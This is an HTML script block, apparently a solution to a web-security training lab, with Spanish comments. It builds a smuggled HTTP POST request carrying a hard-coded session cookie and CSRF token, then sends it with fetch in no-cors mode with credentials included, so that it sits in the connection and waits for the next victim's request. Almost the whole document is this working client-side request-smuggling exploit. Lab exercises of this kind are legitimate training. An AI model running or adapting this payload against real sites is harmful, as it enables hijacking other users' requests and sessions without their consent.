<script>
  // Construimos la petición que será "contrabandeada" (smuggled)
  // Esta petición se quedará en el túnel HTTP esperando a la siguiente víctima o petición
  var smuggledRequest = [
    "POST /en/post/comment HTTP/1.1",
    "Host: 0a2700d203ea680480563a4e0009009d.h1-web-security-academy.net",
    "Cookie: session=10C0ZiNzSfrPlheSkA0EmCPoX1tgGb9H",
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Length: 91",
    "",
    "csrf=AYsRFi6GRECmO9Nfp6MdsDsoe4ew7FRQ&postId=6&name=test&email=test@test.com&comment=smuggled"
  ].join("\r\n");

  // Usamos fetch para enviar el payload al servidor vulnerable
  // El uso de 'no-cors' permite enviar peticiones que de otro modo serían bloqueadas
  fetch("https://0a2700d203ea680480563a4e0009009d.h1-web-security-academy.net", {
    method: "POST",
    body: smuggledRequest,
    mode: "no-cors",
    credentials: "include"
  });
</script>
